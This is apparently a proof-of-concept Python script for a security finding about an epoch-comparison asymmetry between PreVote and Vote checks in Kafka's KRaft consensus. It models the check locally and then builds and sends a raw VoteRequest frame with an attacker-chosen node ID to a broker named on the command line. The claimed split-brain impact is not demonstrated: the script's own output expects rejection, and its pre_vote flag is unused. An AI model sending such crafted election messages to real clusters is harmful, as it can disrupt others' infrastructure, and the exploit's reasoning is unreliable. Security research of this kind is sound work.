#!/usr/bin/env python3
"""
FINDING-005 PoC: KRaft Epoch Asymmetry Between PreVote and Vote
===============================================================
This script demonstrates the epoch boundary condition where:
  PreVote check:  lastEpoch >  replicaEpoch  (strict GT)
  Vote check:     lastEpoch >= replicaEpoch  (GTE)

At the boundary lastEpoch == replicaEpoch, PreVote PASSES but Vote FAILS.
This can be triggered by crafting vote messages at the exact epoch boundary
after manipulating log offsets.

The script does NOT require running against a live KRaft cluster for the
logic demonstration — it models the boolean decision tree from KafkaRaftClient.java
and then shows the network-level framing needed for a real attack.

NOTE: Full exploitation against a live cluster requires Kafka wire protocol
access (port 9093/9094) and is intended for authorized lab environments only.
"""

import struct
import socket
import time
from dataclasses import dataclass
from typing import Optional

# ============================================================
# PART 1: Logic demonstration (no network required)
# ============================================================

def is_illegal_epoch(pre_vote: bool, last_epoch: int, replica_epoch: int) -> bool:
    """
    Exact implementation from KafkaRaftClient.java:
        boolean isIllegalEpoch = preVote ? lastEpoch > replicaEpoch : lastEpoch >= replicaEpoch;
    """
    if pre_vote:
        return last_epoch > replica_epoch      # strict GT
    else:
        return last_epoch >= replica_epoch     # GTE

def check_boundary_condition():
    """
    Demonstrate the asymmetry at lastEpoch == replicaEpoch.
    """
    print("=" * 60)
    print("FINDING-005: KRaft Epoch Asymmetry Demonstration")
    print("=" * 60)
    print()
    print("Scenario: A node has lastEpoch=5, replicaEpoch=5 (boundary case)")
    print()

    last_epoch    = 5
    replica_epoch = 5

    pre_vote_illegal = is_illegal_epoch(pre_vote=True,  last_epoch=last_epoch, replica_epoch=replica_epoch)
    vote_illegal     = is_illegal_epoch(pre_vote=False, last_epoch=last_epoch, replica_epoch=replica_epoch)

    print(f"  PreVote check  (lastEpoch={last_epoch} >  replicaEpoch={replica_epoch}): "
          f"isIllegal={pre_vote_illegal} → PreVote {'REJECTED' if pre_vote_illegal else 'PASSES'}")
    print(f"  Vote check     (lastEpoch={last_epoch} >= replicaEpoch={replica_epoch}): "
          f"isIllegal={vote_illegal} → Vote {'REJECTED' if vote_illegal else 'PASSES'}")
    print()

    if not pre_vote_illegal and vote_illegal:
        print("[!] ASYMMETRY CONFIRMED:")
        print("    A node PASSES PreVote but FAILS Vote at the same epoch boundary.")
        print("    Under adversarial timing, two nodes can simultaneously accumulate")
        print("    PreVote majorities and proceed to election — split-brain scenario.")
    else:
        print("[?] No asymmetry at this boundary (may be patched).")

    print()
    print("Additional boundary cases:")
    test_cases = [
        (True,  4, 5, "normal PreVote (last < replica)"),
        (True,  5, 5, "boundary PreVote (last == replica)"),   # KEY CASE
        (True,  6, 5, "stale PreVote (last > replica)"),
        (False, 4, 5, "normal Vote (last < replica)"),
        (False, 5, 5, "boundary Vote (last == replica)"),      # KEY CASE
        (False, 6, 5, "stale Vote (last > replica)"),
    ]
    print(f"  {'PreVote':8} {'lastEpoch':>10} {'replicaEpoch':>13} {'isIllegal':>10}  Description")
    print(f"  {'-'*8} {'-'*10} {'-'*13} {'-'*10}  {'-'*30}")
    for pv, le, re, desc in test_cases:
        illegal = is_illegal_epoch(pv, le, re)
        marker = " <-- ASYMMETRY" if pv and le == re else ""
        print(f"  {str(pv):8} {le:>10} {re:>13} {str(illegal):>10}  {desc}{marker}")

# ============================================================
# PART 2: Wire protocol framing (for lab testing against live cluster)
# ============================================================

# Kafka request header v2 (api_key=52 is VOTE, api_key=TBD for PREVOTE)
KAFKA_VOTE_API_KEY   = 52   # VoteRequest
KAFKA_FETCH_API_KEY  = 1    # FetchRequest (used to manipulate epoch context)

def encode_int16(v: int) -> bytes:
    return struct.pack(">h", v)

def encode_int32(v: int) -> bytes:
    return struct.pack(">i", v)

def encode_string(s: str) -> bytes:
    encoded = s.encode("utf-8")
    return encode_int16(len(encoded)) + encoded

def build_vote_request(
    cluster_id: str,
    candidate_id: int,
    candidate_epoch: int,
    last_offset_epoch: int,
    last_offset: int,
    pre_vote: bool = False
) -> bytes:
    """
    Build a minimal KRaft VoteRequest wire frame.
    VoteRequest schema (v0):
      cluster_id:          string
      candidate_id:        int32
      candidate_epoch:     int32
      last_offset_epoch:   int32
      last_offset:         int64
    PreVote uses the same schema with a different apiKey/version in some KIP implementations.
    """
    body = (
        encode_string(cluster_id) +
        encode_int32(candidate_id) +
        encode_int32(candidate_epoch) +
        encode_int32(last_offset_epoch) +
        struct.pack(">q", last_offset)   # int64 for last_offset
    )

    api_key     = KAFKA_VOTE_API_KEY
    api_version = 0
    correlation_id = 1
    client_id = "epoch-probe"

    header = (
        encode_int16(api_key) +
        encode_int16(api_version) +
        encode_int32(correlation_id) +
        encode_string(client_id)
    )

    message = header + body
    return encode_int32(len(message)) + message


def demonstrate_epoch_probe(broker_host: str, broker_port: int, cluster_id: str):
    """
    Connect to a KRaft broker and send a VoteRequest at the epoch boundary
    to probe whether the asymmetry exists.

    NOTE: This requires broker port access and appropriate cluster credentials.
    """
    print(f"\n[*] Connecting to KRaft broker {broker_host}:{broker_port}")

    # Craft a VoteRequest where lastEpoch == candidateEpoch (boundary condition)
    candidate_epoch    = 5
    last_offset_epoch  = 5      # == candidate_epoch → boundary
    last_offset        = 100

    payload = build_vote_request(
        cluster_id       = cluster_id,
        candidate_id     = 9999,           # attacker-controlled node ID
        candidate_epoch  = candidate_epoch,
        last_offset_epoch= last_offset_epoch,
        last_offset      = last_offset,
        pre_vote         = False
    )

    print(f"[*] Sending VoteRequest: candidateEpoch={candidate_epoch}, "
          f"lastOffsetEpoch={last_offset_epoch} (boundary: equal)")
    print(f"[*] Per code: isIllegalEpoch = {last_offset_epoch} >= {candidate_epoch} = "
          f"{last_offset_epoch >= candidate_epoch} → request will be REJECTED")
    print("[*] At the same epoch, PreVote would PASS (> instead of >=)")
    print("[*] This asymmetry allows split-brain election under partition conditions.")

    try:
        with socket.create_connection((broker_host, broker_port), timeout=5) as s:
            s.sendall(payload)
            resp_len_bytes = s.recv(4)
            if len(resp_len_bytes) == 4:
                resp_len = struct.unpack(">i", resp_len_bytes)[0]
                resp_body = s.recv(resp_len)
                print(f"[*] Response received ({resp_len} bytes): {resp_body[:32].hex()}")
            else:
                print("[-] No response received (may require TLS / SASL)")
    except Exception as e:
        print(f"[*] Connection note: {e}")
        print("[*] For TLS/SASL-enabled clusters, use kafka-python with SSL context.")


# ============================================================
# Main
# ============================================================
if __name__ == "__main__":
    import sys

    # Always run the logic demonstration
    check_boundary_condition()

    # Optionally run the network probe
    if len(sys.argv) >= 3:
        host       = sys.argv[1]
        port       = int(sys.argv[2])
        cluster_id = sys.argv[3] if len(sys.argv) > 3 else "test-cluster"
        demonstrate_epoch_probe(host, port, cluster_id)
    else:
        print("\n[*] To test against a live KRaft cluster:")
        print(f"    python3 {sys.argv[0]} <broker-host> <broker-port> <cluster-id>")
        print("    Example: python3 finding-005-vote-epoch-craft.py 10.0.1.5 9093 my-cluster")
